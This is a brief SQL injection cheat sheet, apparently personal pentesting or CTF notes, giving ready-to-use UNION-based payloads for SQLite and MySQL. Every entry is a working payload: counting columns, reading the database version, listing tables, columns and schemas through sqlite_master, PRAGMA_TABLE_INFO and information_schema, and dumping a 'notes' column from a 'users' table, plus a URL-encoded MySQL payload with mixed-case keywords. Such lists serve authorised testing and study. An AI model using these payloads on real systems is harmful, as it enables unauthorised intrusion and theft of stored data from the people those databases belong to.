### SQLI

#### SQLITE

```' order by #``` => to get the number of columns

```' union select (select sqlite_version()),NULL,NULL,NULL--``` => to get the sqlite version

```' union select (select group_concat(name) from sqlite_master where type='table'),NULL,NULL,NULL--``` => to get table names

```' union select (SELECT group_concat(name) FROM PRAGMA_TABLE_INFO('users')),NULL,NULL,NULL--``` => to get column names in a table called users

```' union select (SELECT group_concat(notes) FROM 'users'),NULL,NULL,NULL--``` => to get data from notes column in users table

#### MySQL

we can extract most stuff here using information_schema

for version => @@VERSION => union select (@@VERSION)

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,schema_name,0x7c))+from+information_schema.schemata+--+-